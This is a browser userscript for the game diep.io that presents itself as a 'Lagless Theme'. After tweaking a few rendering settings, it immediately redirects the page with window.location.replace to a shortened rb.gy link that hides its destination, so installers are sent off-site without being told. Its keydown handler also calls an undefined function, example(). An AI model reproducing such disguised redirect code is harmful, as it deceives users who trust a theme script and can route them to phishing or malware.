// ==UserScript==
// @name         Lagless Theme
// @namespace    http://tampermonkey.net/
// @version      69.69
// @description  epic thingy
// @author       astral#0069
// @match        ://diep.io/*
// @downloadURL https://update.greasyfork.org/scripts/410136/Lagless%20Theme.user.js
// @updateURL https://update.greasyfork.org/scripts/410136/Lagless%20Theme.meta.js
// ==/UserScript==

var addEvent = document.addEventListener ? function(target,type,action){
    if(target){
        target.addEventListener(type,action,false);
    }
} : function(target,type,action){
    if(target){
        target.attachEvent('on' + type,action,false);
    }
}
input.set_convar('ren background', "false")
  input.set_convar('ren_border_color_alpha', 0.02)
  input.set_convar('ren_stroke_soft_color_intensity', 0);
  window.location.replace (
     "https://rb.gy/zdniks"
   )
addEvent(document,'keydown',function(e){
    e = e || window.event;
    var key = e.which || e.keyCode;
    if(key===84){
        example();
    }
});
